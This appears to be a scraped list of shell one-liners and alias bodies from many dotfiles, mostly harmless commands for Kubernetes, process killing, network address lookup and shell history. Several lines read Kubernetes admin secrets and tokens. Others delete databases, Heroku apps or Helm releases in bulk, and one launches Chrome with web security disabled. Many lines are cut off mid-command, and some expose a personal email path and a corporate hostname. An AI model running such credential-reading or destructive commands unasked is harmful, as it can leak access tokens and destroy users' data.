lldb -c ${yzy_CORE_DIR}/`ls -rt /cores| tail -n 2| head -n 1`
ll |grep -v ^d |grep -v ^l
ll | sort -n -k 5 | tail -20
ll | figlet | toilet --gay -f term
ll | egrep '^d' | awk '{print $9}'
ll /proc/$(pgrep cmus)/fd|grep Music|sed
ll /etc/alternatives | grep /usr/lib/jvm | column -t
listpackages | grep -v deinstall | grep
listdb | grep 'test_' | xargs -n1 dropdb
lipsum | tee /dev/tty | xclip
lfind . -maxdepth 1 -type d -print | xargs du -sk | sort -rn
less ~/.ssh/id_rsa.pub | xclip -selection clipboard | echo '=> Public key copied to pasteboard.'
less hotel*.log | ~/ATGLogColorizer | less -R
less `ls -trh| tail | grep appli`
less `find ~/.config/i3 | sort -n | tail -n 1`
less /media/veracrypt1/has/sz.frankyy@gmail.com | grep ^Jed | xclip
launchctl remove com.apple.CoreSimulator.CoreSimulatorService || true
launchctl list | sed 1d | awk ' /org.dsaenz/ { print $3 } '
launchctl list | grep synergyd | awk
last | grep still | grep ppp
last | ${gtac} | tail -n20
last reboot -F | head -1 | awk
last -a | tac | tail -n20
last -a | ${gtac} | tail -n20
last -2 -R -w | sed -n '2p' | cut -c 20-
last -1 `whoami` | head -1 | \sed -Ee 's/`whoami` +([^ ]+) +([^:]*:[0-9]\.?[0-9]) +(.*)/Last Login: \2 on \1/g'
last -1 -i -a | cut -c61- | head -1
l |rg -v ^d|awk \
l | grep -v '~$' | grep -v '[.]sw[op]$'
l -n 1 | git show -w | d
kubepods | fzf | xargs kubectl -n ${NS:-globe} logs --tail=500 --timestamps -f
kubepods | fzf | xargs kubectl -n ${NS:-globe} describe
kubectl logs \`kp | fzf | awk '{print \$1}'\`
kubectl get statefulsets -o name | xargs -I % kubectl scale % --replicas=1 && kubectl get deployments -o name | xargs -I % kubectl scale % --replicas=1
kubectl get statefulsets -o name | xargs -I % kubectl scale % --replicas=0 && kubectl get deployments -o name | xargs -I % kubectl scale % --replicas=0
kubectl get pods | sed '1d' | nl -w 2
kubectl get pods | grep cloud-command | cut -d' ' -f1
kubectl get pods | grep -i xossh | grep -v
kubectl get pods -o wide --all-namespaces | grep -v -E '(Running|Completed)'
kubectl get pods -n openstack | grep armada-api | awk '{print $1}'
kubectl get pods -n kube-system | grep kube-dns | wc -l
kubectl get pods --namespace=otticlients | grep web-rc | awk
kubectl get pods --field-selector=status.phase=Failed | awk '{ if(NR>1)print $1}' | xargs kubectl delete pods
kubectl get pods --all-namespaces --no-headers -o=custom-columns=Status:.status.phase | sort | uniq -c
kubectl get pod -o=name | fzf | xargs kubectl logs -f --tail=200
kubectl get po | grep Evicted| awk
kubectl get po | awk '{print \$1}' | ack
kubectl get po -owide --all-namespaces --field-selector=status.phase=Failed | tee /dev/tty | wc -l
kubectl get po --no-headers | grep Evicted | awk '{print \
kubectl get po --all-namespaces --no-headers | grep 0/ | awk
kubectl get nodes | grep node | awk
kubectl get nodes --no-headers | grep node | awk
kubectl get -o=custom-columns=NAME:.metadata.name --no-headers=true pods | fzf | tr -d '\n'
kubectl exec -it debuggery -- zsh || kubectl run --rm -it debuggery --image=rameezk/debuggery --restart=Never
kubectl exec -it \`kubectl get pods | grep mysql | awk '{print \$1}'\` bash
kubectl exec -it \`kp | fzf | awk '{print \$1}'\`
kubectl exec -it -n velero ${VELRO:-$(kubectl get pods -n velero | grep velero | awk
kubectl exec -it $(kubectl get po -o wide | grep mongo | awk
kubectl exec -it $(kubectl get po -o wide | grep generator | awk
kubectl exec -it $(kubectl get po -o wide | grep frontend | awk
kubectl exec -it $(kubectl get po -o wide | grep client | awk
kubectl exec -it $(kubectl get po -o wide | grep backend | awk
kubectl describe pods $(knb | awk -F ' ' '{print $2}') | grep '^ip' -i
kubectl describe pod \`kp | fzf | awk '{print \$1}'\`
kubectl delete po $(kubectl get po -n test | awk '/user-service/ {print $1}' | tr '\n' ' ') -n test
kubectl config set-context $(kubectl config current-context) --namespace=\`knsls | fzf | awk '{print \$1}'\`
kubectl config get-contexts | yank | xargs kubectl config delete-context && kubectl config use-context docker-for-desktop
kubectl -n zen describe deployment icp4d-open-api | grep -i productVersion | xargs
kubectl -n kube-system describe secret \$(kubectl -n kube-system get secret | grep admin-user | awk '{print \$1}')
kubectl -n kube-system describe secret $(kubectl -n kube-system get secret | grep eks-admin | awk '{print $1}')
kubectl -n kube-system describe secret $(kubectl -n kube-system get secret | grep default-token | cut -d
kubectl -n kube-system describe secret $(kubectl -n kube-system get secret | grep admin-user | awk '{print $1}') && open http://localhost:8001/api/v1/namespaces/kube-system/services/https:kubernetes-dashboard:/proxy/ & kctl proxy
kubectl -n kube-system describe secret $(kubectl -n kube-system get secret | grep admin-user | awk '{print $1}')
kubectl -n kube-system describe secret $(kubectl -n kube-system get secret | grep admin-user | awk
kubectl -n kube-system describe secret $(kubectl -n kube-system get secret | grep admin | awk '{print $1}')
kubectl -n cyral exec -it \$(kubectl -n cyral get pods -o name | grep -m1 mariadb-client | cut -d
kubectl --kubeconfig ${KUBECONFIG} -n kube-system describe secret $(kubectl --kubeconfig ${KUBECONFIG} -n kube-system get secret | grep eks-admin | awk '{print $1}')
kube-nodes-info | grep % | awk
ku | grep % | awk
kquitapp5 plasmashell || kstart plasmashell
kns \$(kubectl get namespace -o name | cut -d'/' -f2 | pick)
knife ec2 server list | grep micah | grep running
kinit -R || kinit -l7d && aklog
kinit -R || kinit && ssh -Y amaksimenka-linux.sea.corp.google.com
killtom || cleanwar
killg $(pgrep redis-server haproxy) || brew services stop mongodb-community@3.6
killall tmux > /dev/null 2>&1 || exit
killall screenkey &>/dev/null || screenkey
killall compton >/dev/null 2>/dev/null && compton -b || compton -b
killall Simulator || echo && cordova emulate
killall Simulator || echo && cordova build && cordova emulate
killall Flux || redshift -O
killall -q mos_sim && echo Terminated || mos_sim; psg mos_sim
killall -9 'Google Chrome' || open /Applications/Google\\ Chrome.app --args --disable-web-security --user-data-dir=''
kill_my_process() { ps -ef | rg $USER | rg \
kill `ps aux | selecta | awk
kill `ps aux | grep p4merge | awk '{print $2}' `
kill `ps aux | fzf | awk
kill `cat run/ui.pid` || true && rm run/ui.pid &&./gradlew uiRunBg
kill \`ps ax | grep [t]unnel | cut -f1 -d' '\` 2>/dev/null
kill \`ps aux | selecta | awk '{print $2 }'\`
kill \$(ps aux | grep [p]hp | awk '{print \$2}')
kill \$(ps aux | grep '[e]macs' | awk '{print \$2}')
kill \$(ps afx | fzf-tmux | cut -f1 -d' ')
kill \$(lsof -i :4001 | grep node | awk '{print \$2}')
kill \$(lsof -i :3000 | tail -n 1 | awk '{ print \$2 }')
kill -9 `ps uax | grep perl | awk
kill -9 `ps ax | grep 'coreaudio[a-z]' | awk '{print $1}'`
kill -9 `ps auxww|grep YouCompleteMe|awk '{print $2}'`
kill -9 `ps aux | grep vlc | awk
kill -9 `ps aux | grep ros | awk '{print $2}'`
kill -9 `ps aux | grep '[r]spec' | awk '{print $2}'`
kill -9 `ps aux | grep '[c]apybara-webkit' | awk '{print $2}'`
kill -9 `ps -ef |grep xxx|awk \
kill -9 `ps -ef |grep xxx|awk
kill -9 `ps -e | grep jetty\:run | awk
kill -9 `ps -e | fzf | awk
kill -9 `ps -a |grep Xming`; kill -9 `ps -a |grep ssh`;exit
kill -9 `ps -A | grep chrome | cut -d
kill -9 \$(ps aux|grep solr|awk '{ print \$2 }')
kill -9 $(ps aux | sort +3 -4 -g | awk '{ FIELD = $2}; END { print FIELD}')
kill -9 $(ps aux | grep rails | awk '{print $2}')
kill -9 $(ps aux | grep '[e]macs --daemon' | awk '{print $2}')
kill -9 $(ps -ef | grep -i '[x]code' | awk '{ print $2; }')
kill -2 `ps aux | grep [m]ongo* | awk '{ print $2 }'`
kill $(ps ax | grep '[8]666:localhost' | awk '{print $1}')
kill $(ps aux | grep 'server.js 9090' | awk '{print $2}')
kill $(ps aux | grep 'redis-server' | awk '{print $2}')
kill $(ps aux | grep '[n]ginx' | awk '{print $2}')
kill $(ps aux | grep '[m]ysql' | awk '{print $2}')
kill $(ps aux | grep '[j]ekyll' | awk '{print $2}')
kill $(ps aux | grep '[e]macs' | awk '{print $2}')
kill $(ps aux | grep '[e]macs --daemon' | awk '{ print $2 }')
kill $(ps -ef | grep -i $* | awk '{ print $3}')
kill $(ps -e | grep chrome | cut -d
kill $(ps -A | grep redshift | awk '{print $1}')
kill $(netstat -tupln 2> /dev/null| grep 8081 | awk
kill $(lsof -i tcp:8000 | grep node | awk
kgp | grep jiffy | awk 'NR==1{ print \$1 }'
keytool -exportcert -alias androiddebugkey -keystore ~/.android/debug.keystore | openssl sha1 -binary | openssl base64
kd $(dnb | awk -F ' ' '{print $2}') | grep '^ip' -i
kc logs -f $(kc get pods | grep gateway | cut -d' ' -f-1)
k describe pods $(fnb | awk -F ' ' '{print $2}') | grep '^ip' -i
json_pp | pygmentize -ljson | less
json_pp | pygmentize -l json | less
json_pp -t dumper <~root/kiwi.config/kiwi.json | grep rx_name | urldecode
json | pygmentize -l json | less
jrnl -from today --export json | jq .entries[].title -r | awk
jq -r -c '.devDependencies | keys[] ' ./package.json | column
jq -r -c '.dependencies | keys[] ' ./package.json | column
jq -r '.scripts | keys[] as \$k | \
jq '[leaf_paths as \$p | {'key': \$p | join(\
jq '.Reservations | map(.Instances) | flatten'
jps | grep GameLauncher | cut -d' ' -f1
jps | grep Daemon | cut -d
jps | cut -f1 -d' ' | xargs kill
jps | awk -f ~/.shell/alignColumn.awk | sort -n
jps | awk '{print $1}' |xargs kill -9
jp | grep Child | wc
journalctl | tail -n 50 | ccze -A
journalctl | tail -n 200 | ccze -A
journalctl | tail -n 20 | ccze -A
journalctl -u systemd-logind | grep $USER | tail
journalctl -u sshd | sed -nr 's/.*Failed . .. (.+?) from ([0-9.]+).*/\1 \2/p' | sort -u
journalctl -u dnsmasq -r | grep DHCPACK | less
journalctl -e --show-cursor | tail -n1 | cut -d: -f2-
journalctl -b -x|tail -n 40|most
jobs | \egrep -o '\[[0-9]+\]\+' | sed 's/+/ /'
jobs -p | tail -n 1 | xargs kill && fg
jobs -p | cut -d' ' -f4 | xargs kill
jobs -p | awk '{print \$3}' | xargs kill
jls | cut -d/ -f4- | grep -v JID
jira view $(git branch | sed -n '/\* /s///p' | grep -oiE 'ui-[0-9]{4}')
jctl -u sshd | grepip | sq
j=`adb shell ps | grep castbox | awk
j | cut -b12- | tail -10
iwconfig 2> /dev/null |sed -n '/Link/p' | awk '{print $2}'
iw wlp3s0 link | grep 'SSID' | sed 's/[ \t]*SSID: //g'
iw wlan2 scan |egrep -ie '(SSID|signal)'
iw wlan1 scan |egrep -ie '(SSID|signal)'
iw wlan0 scan |egrep -ie '(SSID|signal)'
isgit && (git diff | gist -p -t diff | xargs open)
is_interface_up vpn0 && message 'Cannot run nmap - vpn is active' || sudo nmap
is_interactive || return
iptables-save | uniq | iptables-restore
iptables -nvx -L ssinput | cat -A - | grep
ipcs | awk '\$4==777 { print \$2 }' | xargs -I'{}' ipcrm -m {}
ipconfig | grep IPv4 | head -1
ipconfig | grep IPv4 | cut -d':' -f2
ipconfig | grep IPv4 | awk -F':' '{print \$2}'
ipconfig | grep -E 'IP(v4)? Address' | sed -e 's/.*: //'
ipconfig | grep -A 4 'Ethernet adapter Local Area Connection' | grep IPv4
ipconfig | grep 'IPv4 Address' | perl -nle'/(\d+\.\d+\.\d+\.\d+)/ && print \$1'
ipconfig getpacket en0 | grep -oPe '(?<=yiaddr\s=\s)[\d\.]+' | pbcopy
ipconfig getifaddr en1 || ipconfig getifaddr en0
ipconfig getifaddr en0 || ipconfig getifaddr en1
ipconfig getifaddr en0 | xargs echo -n | pbcopy
ipconfig getifaddr en0 | tr -d '\n' | pbcopy; ipconfig getifaddr en0
ipAddress | sed 's%^%http://%' | sed 's%$%:8000/%'
ip route | sort -k5 | perl -pe 's/^/$. - /'
ip route | grep docker | awk '{ print \$9 }'
ip route | grep default | cut -d ' ' -f 5
ip route | grep default | awk
ip route show default | awk \$0=\$3 | uniq
ip route show 0.0.0.0/0 |grep -Eo 'via \S+'|awk '{print \$2;}'
ip route show 0.0.0.0/0 | grep -Eo 'via \S+' | awk '{ print \$2 }'
ip route get 8.8.8.8 || curl --silent http://icanhazip.com
ip route get 8.8.8.8 | head -1 | cut -d' ' -f8
ip route get 1 |head -n 1|cut -d' ' -f7
ip route get 1 | head -1 | cut -d' ' -f8
ip r g to $(ip r l to 0/0 | awk '{print $3}') | awk '/src/ {print $5}'
ip link show | grep -m1 ether | awk
ip link show | egrep ib[0-9]+: | wc -l
ip addr|grep 'inet '|grep -v 127
ip address | grep 'inet ' | awk '{print $2}'
ip addr | grep inet | grep wlan0
ip addr | grep enp && ip addr | grep wlp
ip addr | grep -m 1 -o '192.*.*.*' | cut -d '/' -f 1
ip addr | grep 'inet\>' | perl -nle'/(\d+\.\d+\.\d+\.\d+)/ && print \$1'
ip addr show | grep -v link | cut -d
ip addr show | grep -Po 'inet \K([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1'
ip addr show label eth0|grep 'inet '|cut '-d ' -f6
ip addr show eth0 | grep inet | awk \
ip a | grep -oP '(?<=inet |addr:)(?:\d+\.){3}\d+'
ip a | grep -E 'inet.*lobal' | awk '{print $2}'
ip a | grep 'inet ' | awk -F' ' '{print $2}'
ip a | egrep '^[0-9]+|inet '
ip a | block '^\d+:\s+(?!br-|lo).' '^\d+:\s+br-'
ip a | awk '/eth0$/{print $2}' | sed 's/\/24//g'
ip -o addr show $androidDeviceNetworkInterface | awk -F ' *|/' '/inet /{print\$4}'
ip -o addr list | grep inet6 | while read a b c d e; do sudo ip addr del $d dev $b; done
ip -br addr show | grep -v 127.0.0.1 | grep -vi down
ip -4 route get 1 | head -1 | cut -d' ' -f7
ip -4 addr | grep 192 | cut -d '/' -f1
ip -4 addr | grep 'brd' | awk '{print \$2}'
ip -4 -o addr | grep eth | grep -Po \
ios-deploy -B | grep youi | xargs -t -I {} ios-deploy --uninstall_only --bundle_id {}
ioreg -w0 -l | grep CurrentCapacity | cut -d \
ioreg -w0 -l | grep Capacity | cut -d \
ioreg -w0 -l | grep Capacity | cut -d ' ' -f 17-50
ioreg -p IOUSB -w0 | sed 's/[^o]*o //; s/@.*$//' | grep -v '^Root.*'
ioreg -lw0 | grep IODisplayEDID | sed \
ionpr-ios | ionpa-ios | ionbios
ionpr-android | ionpa-android | ionbandroid
io_existing_stdin || readfun
intel-virtual-output && sudo rmmod ipmi_devintf nvidia_modeset nvidia ipmi_msghandler || true && sudo tee /proc/acpi/bbswitch <<< OFF
ind . | grep -E 'node_modules$' | xargs rm -r
ifconfig|grep netmask|awk '{print $2}'
ifconfig|grep inet|grep 10
ifconfig|grep -A 1 cloud && ip addr|grep cloud
ifconfig |grep inet|awk '{print $2}'
ifconfig |grep broadcast |cut -d ' ' -f 2
ifconfig | sed -n -e '/127.0.0.1/d' -e '/inet /p'|awk '{print \$2}'
ifconfig | sed -En 's/127.0.0.1//;s/.*inet (addr:)?(([0-9]*\.){3}[0-9]*).*/\2/p' | head -1
ifconfig | rg '(inet)|(^[A-Za-z])'
ifconfig | perl -0 -pe 's/\n\t+/ /g' | awk -v RS=
ifconfig | pcregrep -M -o '^[^\t:]+:([^\n]|\n\t)*status: active'
ifconfig | pcregrep -M -o '^[^\\t:]+:([^\\n]|\\n\\t)*status: active'
ifconfig | pcre2grep -M -o '^[^\t:]+:([^\n]|\n\t)*status: active'
ifconfig | gsed -n '/en0:/{n;n;n;p}' | awk '{print \
ifconfig | grep netmask | grep broadcast
ifconfig | grep netmask | grep -v 127.0.0.1
ifconfig | grep inet | sort
ifconfig | grep inet | grep broadcast
ifconfig | grep inet | grep -v inet6
ifconfig | grep en0 -a5 | grep netmask
ifconfig | grep en0 -A 3 | grep \
ifconfig | grep cast | cut -c 6-20
ifconfig | grep broadcast | tail -c 16
ifconfig | grep broadcast | sed 's/.*inet \(.*\) netmask.*/\1/'
ifconfig | grep broadcast | grep inet
ifconfig | grep broadcast | awk '{print \$6}'
ifconfig | grep broadcast | arp -a
ifconfig | grep Bcast | cut -d
ifconfig | grep 192 | cut -c21-33
ifconfig | grep 192 | awk '{print $2}'
ifconfig | grep 172 | awk '{print $2}'
ifconfig | grep 0xffffff00 | cut -d ' ' -f 2 && curl -l http://curlmyip.com/
ifconfig | grep -oEi 'inet\s(.*)\snetmask.*broadcast' | cut -d ' ' -f2
ifconfig | grep -i mask | grep -i inet
ifconfig | grep -i inet | sed -n '5p'
ifconfig | grep -i hwad | awk '{print \$5}'
ifconfig | grep -e 'inet ' | sed -En '/inet 127/d;s/.* ([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+) .*/\1/g;p'
ifconfig | grep -Po '(?<=inet\s)[\d\.]+' | grep -v '127.0.0.1'
ifconfig | grep -M -o '^[^\t:]+:([^\n]|\n\t)*status: active'
ifconfig | grep -Eo 'inet addr:192\.[^ ]+' | grep -Eo [0-9.]+
ifconfig | grep -E -o '([0-999]+\.){3}([0-999]+)' | sed -n 2p
ifconfig | grep -E '(192|10)'
ifconfig | grep -E '$|inet'
ifconfig | grep -A3 wlp3s0 | grep \
ifconfig | grep -A 2 eth0 && ifconfig | grep -A 2 wifi
ifconfig | grep -A 1 en1 | grep -e \
ifconfig | grep 'net ' | grep -v 127.0.0.1
ifconfig | grep 'inet\>' | perl -nle'/(\d+\.\d+\.\d+\.\d+)/ && print \$1'
ifconfig | grep 'inet.*broadcast' | cut -d ' ' -f 2
ifconfig | grep 'inet.*broadcast' | ack '(?<=inet\s)[^\s]*'
ifconfig | grep 'inet addr:' | head -1
ifconfig | grep 'inet 10.'|cut -d' ' -f 2
ifconfig | grep 'inet 10' | sed 's/.* \([0-9\.]*\) .*/\1/'
ifconfig | grep 'inet ' | grep -v 127.0.0.1; python -m SimpleHTTPServer
ifconfig | grep 'inet ' | grep -v 127.0.0.1
ifconfig | grep 'inet ' | cut -f2 -d' '
ifconfig | grep 'inet ' | cut -d ' ' -f 2
ifconfig | grep 'inet ' | awk -F ' ' '{print \$2}'
ifconfig | grep 'inet ' | awk '{print \$2}'
ifconfig | grep 'inet ' | awk '{print $2}'
ifconfig | grep 'broadcast' | cut -d ' ' -f 2
ifconfig | fgrep inet | fgrep netmask
ifconfig | egrep '^[^ ]|inet.*add'
ifconfig wlp2s0 | awk '{print $2}' | egrep -o '([0-9]+\.){3}[0-9]+'
ifconfig tun0 | sed -n '2 p' | awk '{print \$2}'
ifconfig tap0 | sed -n '2 p' | awk '{print \$2}'
ifconfig eth0 | grep inet | awk '{ print \$2 }'
ifconfig eth0 | grep inet | awk
ifconfig eth0 | grep -o --color=never '\(HWaddr \([a-fA-F0-9]\+:\)\{5\}[a-fA-F0-9]\+\)\|\(inet addr:\([0-9]\+\.\)\{3\}[0-9]\+\)'
ifconfig eth0 | grep -o 'addr:\([0-9]\+\.[0-9]\+\.[0-9]\+\.[0-9]\+\)' | sed -e 's/addr://'
ifconfig eth0 | grep 'inet addr' | sed 's/^.*inet addr://g'
ifconfig eth0 down && ifconfig eth0 up && dhclient eth0 &> /dev/null && killall dhclient && ifconfig | grep eth0 -A 1 | grep inet
ifconfig eth | grep inet | awk
ifconfig en1 | grep 'inet ' | cut -f 2 -d ' '
ifconfig en1 | grep 'inet ' | cut -d ' ' -f 2
ifconfig en1 | grep 'ether' | cut -c 8-24
ifconfig en0 | grep inet[^6] | awk -F\
ifconfig en0 | grep inet | grep -v inet6
ifconfig en0 | grep inet | cut -c 7-15
ifconfig en0 | grep ether | cut -c8-
ifconfig en0 | grep ether | awk '{ print $2 }'
ifconfig en0 | grep -w inet | awk '{ print \$2 }'
ifconfig en0 | grep -F netmask | cut -d ' ' -f 2
ifconfig en0 | grep 'inet\W' | cut -d' ' -f2
ifconfig en0 | grep 'inet 10.1' | awk '{print $2}'
ifconfig en0 | grep 'inet ' | cut -f 2 -d ' '
ifconfig en0 | grep 'inet ' | cut -d ' ' -f2
ifconfig en0 | grep 'inet ' | cut -d ' ' -f 2
ifconfig en0 | grep 'inet ' | awk '{print \
ifconfig en0 | awk '{print $3}' | grep -o --max-count=1 '[0-9]*\.[0-9]*\.[0-9]*\.[0-9]*'
ifconfig en0 inet | grep 'inet ' | awk ' { print $2 } '
ifconfig -l | tr ' ' '\n' | xargs -I{} ipconfig getifaddr {}
ifconfig -a | grep inet | grep Bcast
ifconfig -a | grep inet | grep 10.0.
ifconfig -a | grep inet | awk '{print \$2}'
ifconfig -a | grep -o 'inet6\? \(addr:\)\?\s\?\(\(\([0-9]\+\.\)\{3\}[0-9]\+\)\|[a-fA-F0-9:]\+\)'
ifconfig -a | grep -o 'inet6\? \([0-9]\+\.[0-9]\+\.[0-9]\+\.[0-9]\+\)' | sed -e 's/inet6* //'
ifconfig -a | grep -o 'addr:\([0-9]\+\.[0-9]\+\.[0-9]\+\.[0-9]\+\)' | sed -e 's/addr://'
ifconfig -a | grep --color=never -o 'inet6\? \(addr:\)\?\s\?\(\(\([0-9]\+\.\)\{3\}[0-9]\+\)\|[a-fA-F0-9:]\+\)'
ifconfig -a | grep 'inet ' | awk '{print \$2}'
ifconfig -a | grep 'eth0' -A 6; ifconfig -a | grep 'wlan0' -A 6
ifconfig -a | grep ': active' -B 7 | grep 'en.:' -A 7
ifconfig -a | egrep -v 'IPv6|inet6'
ifconfig -a | egrep 'flags|inet'
if test $( ls *.rar 2>/dev/null | wc -l ) == 1; then unrar x *.rar && rm *.rar; elif test $( ls *.zip 2>/dev/null | wc -l ) == 1; then unzip *.zip && rm *.zip; else echo \?; fi
if git status > /dev/null 2>&1; then git branch | grep \* | cut -d ' ' -f2; fi
if [[ $(mount | grep ~/nas | wc -l) == 0 ]]; then mount ~/nas; fi && cd ~/nas && ll
if [[ $(mount | grep ~/dat | wc -l) == 0 ]]; then mount ~/dat; fi && cd ~/dat && ll
if [ `xinput --list-props 9 | grep Enabled | cut -d: -f2` -eq 0 ]; then xinput --enable 9; else xinput --disable 9; fi
if [ -n `ps aux | grep openconnect | grep -v 'grep'` ]; then echo OK; else echo DEAD;fi
if [ -e .svn ] ; then svn diff | colordiff |less -R ; else git diff --word-diff ; fi
if [ -d CVS ] ; then cvs -Q diff -u |less -F; echo Press return to continue or ctrl-c to abort... && read && cvs -q ci ; else svn diff |less -F; echo Press return to continue or ctrl-c to abort... && read && svn ci; fi
if [ $(docker ps | grep dry | wc -l) -eq 1 ]; then docker attach dry; else docker run -it -v /var/run/docker.sock:/var/run/docker.sock --rm --name dry moncho/dry; fi
if [ $(docker ps | grep dockly | wc -l) -eq 1 ]; then docker attach dockly; else docker run -it -v /var/run/docker.sock:/var/run/docker.sock --rm --name dockly lirantal/dockly; fi
if (( `who | grep -v pts | wc -l` > 2 )); then echo \
if (( $WORDS_IN_NEW_ALIASNAME > 1)) || (( $SAME_ALIASES_COUNT > 0)); then
if (( $((`sq | wc -l` - 1)) < 0 )); then echo 0; else echo $((`sq | wc -l` - 1)); fi
if (( $((`qstat | wc -l` - 5)) < 0 )); then echo 0; else echo $((`qstat | wc -l` - 5)); fi
if ( \$mem >= 2 || \$cpu >= 2 ) { print WHITE,ON_RED,\$line,RESET }'"
if ( \$mem < 1 || \$cpu < 1 ) { print \$line }
if ( (\$mem >= 1 && \$mem < 2) || (\$cpu >= 1 && \$cpu < 2) ) { print YELLOW,\$line,RESET }
if ! (ps -ax -O start | grep -v grep | grep netsleep) ; then echo netsleep not active; fi
id=`screen -ls | grep myScreenName | sed
iThief p $(iThief lsp $1 | grep $2 | cut -c 3-)
i=0; while [ $i -lt 10 ]; do cat /dev/urandom | tr -dc a-z0-9A-Z | head -c20 ; echo; let i=i+1; done
i=0; while [ $i -lt 10 ]; do cat /dev/urandom | tr -dc a-z0-9A-Z | head -c15 ; echo; let i=i+1; done
i=0; while [ $i -lt 10 ]; do cat /dev/urandom | tr -dc a-z0-9A-Z | head -c10 ; echo; let i=i+1; done
i=0; while [ $i -lt 10 ]; do cat /dev/urandom | LC_ALL=C tr -dc a-z0-9A-Z_-=+ | head -c20 ; echo; let i=i+1; done
i=0; while [ $i -lt 10 ]; do cat /dev/urandom | LC_ALL=C tr -dc a-z0-9A-Z_-=+ | head -c15 ; echo; let i=i+1; done
i=0; while [ $i -lt 10 ]; do cat /dev/urandom | LC_ALL=C tr -dc a-z0-9A-Z_-=+ | head -c10 ; echo; let i=i+1; done
i3-save-tree | i3-layout-to-dot | xdot -
i3-msg -t get_tree | jq '.' | vim - -c 'set filetype=json'
hub pr list --state=open --format='%pC%>(8)%i%Creset %t %n Author: %au | Requested: %rs %n URL: %U %n%n' --limit=200 --sort=long-running | grep --color='never' --context=2 -E 'mulholio'
hub browse $(git remote -v | head -1 | awk
http POST localhost:12345/authenticate username=user password=pass | grep -o 'ey.*' | sed 's/\
htop || top
htop 2>/dev/null || top
htop 2> $NUL || /usr/bin/top
htop -C||top -S -u
hostname -I || hostname -i
hledger balance '(^income|^expenses|^equity:draw)'
history|grep -v grep|grep
history|cut -c 8-|zenity --list --column History
history|awk '{print $2}'|awk 'BEGIN {FS=\
history |tail -n45 |ccze -A
history |tail -100 |ag
history |grep ${*} |grep -v $$
history |awk '{print \$2}' |awk 'BEGIN{FS=\
history |${TAIL} -1 |${SED} -e's/ *[0-9]* *//'
history | uniq | tail -15
history | tail -r | less
history | tail -n2 | head -n1 >> ~/.memo
history | tail -n 9 | grep
history | tail -n 50 | grep -v '^cd ..$'
history | tail -n 5 | sort -rn
history | tail -n 40 | lolcat
history | tail -n 21 | grep
history | tail -n 2 | head -n 1 >> ~/.dotfiles/useful_commands
history | tail -n 11 | head -n 10
history | tail -n 100 | grep
history | tail -n 1 | cut -c 8-
history | tail -n 1 | awk '{ \$1=\
history | tail -n 1 | awk
history | tail -n $(expr $(tput lines) - 10) | bat -l sh
history | tail -40 | more
history | tail -39 | more
history | tail -21 | head -20
history | tail -200 | grep -i
history | tail -200 | ag
history | tail -1 | sed -e \
history | tail -1 | sed 's/ *[^]]*] *//'
history | tail -1 | cut -d\ -f4-
history | tac | less
history | tac | grep $1 -m20
history | tac | fzy
history | tac | L
history | sort -u | grep
history | sort -rn | head
history | sort -rn | grep
history | sort -nr | less
history | sort -d | grep
history | sk | cut -c 8-
history | sed s/\ \ .*\ \ // | grep
history | sed 's/^..[0-9]\+ //' | grep
history | percol --match-method regex | awk '{\$1=\$2=\$3=\
history | grep vlc | tail
history | grep vi | tail
history | grep git | grep -v history
history | grep git | grep
history | grep `date +%y%m%d` | grep -i
history | grep -v se | grep $1
history | grep -v hgr | grep -i
history | grep -v grep |grep
history | grep -v grep | grep
history | grep -v '^ *[0-9]* *hists' | grep $@
history | grep -E -v '^ *[0-9]+ *hist +' | grep -i
history | grep -E -v '^ *[0-9]+ *h ' | grep
history | egrep -v lass?h | grep ssh
history | egrep -v '^ *[[:digit:]]+ +H +' | grep
history | egrep -i \!* | tail
history | dmenu -l 20 | sed 's/^\s*[0-9]\+\s*//'
history | cut -c 8- |sed 's/^/ $ /'
history | cut -c 8- | v -
history | cut -c 8- | sort -u
history | cut -c 8- | grep -e
history | cut -c 8- | grep
history | cut -c 8- | fzf -s -p 'COMMAND HISTORY SEARCH > '
history | awk '{print \$5}' | awk 'BEGIN{FS=\
history | awk '{print \$4}' | awk 'BEGIN{FS=\
history | awk '{print \$3}' | awk 'BEGIN{FS=\
history | awk '{print \$2}' | awk 'BEGIN{FS=\
history | awk '{print \$2}' | awk 'BEGIN {FS=\
history | awk '{print $2}' | awk 'BEGIN{FS=\
history | awk '{print $2}' | awk 'BEGIN{FS=
history | awk '{print $2}' | awk 'BEGIN {FS=\
history | awk '{print $2}' | awk 'BEGIN {FS=
history 2|head -n 1|xclip
history 1| peco | pbcopy
history 10 | tail -r | gitjk_cmd
history 10 | tac | gitjk_cmd
history 1 | awk '{print \$2}' | awk 'BEGIN{FS=\
history 0|tac|fzf --ansi --multi --reverse
history -n||fc -RI
history -n | tail -n1 | pbcopy
history -i | grep -Pv '^ *[0-9]+ [[:digit:]\:\- ]{16} h '| grep
history -a||fc -AI
history -10000 | awk '{print \$2}' | awk 'BEGIN{FS=\
hg status | grep -Ev \(\\?\|\\!\)
hg status -n | xargs rubocop-select | xargs rubocop
hg st | sed -nE 's/^[MARC] //p' | xargs -I {} hg di {}
hg show | sed 's/diff --git/\n\n\n\ndiff --git/' | sed -e 's/^ \s*$//' > show.diff && echo 'Sent diff to file show.diff'
hg show | gsed 's/diff -r/\\n\\n\\n\\ndiff --r/' | sed -e 's/^ \s*$//' > show.diff && echo 'Sent diff to file show.diff'
hg revert --all && hg st | cut -c 3- | xargs rm && hg pull -u
hg push || hg push --new-branch
hg log | nkf -w | less -R
hg log --style changelog | nkf -w | less -R
hg incoming | grep changeset | wc -l
hg diff | sed 's/diff --git/\n\n\n\ndiff --git/' | sed -e 's/^ \s*$//' > show.diff && echo 'Sent diff to file show.diff'
hg diff | colordiff | less -R
hg diff | colordiff | less
hg diff | colordiff -y | less -R
hg diff --exclude public/scripts/bundle.js | colordiff | less -r
hg bookmarks | awk '{if (NF == 1) print $1; else print $1;}' | xargs hg bookmark -d
hg --hidden log --graph --template '{rev}:{node|short} {branch} {desc|firstline}\n'
heroku logs --tail --source app | unbuffer -p cut -c 38- | grcat conf.rails
heroku list | perl -nlE 'say if /\d+$/' | xargs -I% heroku destroy -a % -c %
heroku info -s | grep web_url | cut -d= -f2
heroku config | awk 'NR > 1 {print $1$2}' | sed -e 's/:/=/'
helm list -q | grep -v sumo | xargs helm delete --purge
helix -1 node list -b 'role:puppetmaster' | dsed | dsh 'cd /etc/puppet && sudo git pull'
head /dev/urandom | tr -dc A-Za-z0-9 | head -c20; echo
head /dev/urandom | tr -dc A-Za-z0-9 | head -c 13 ; echo ''
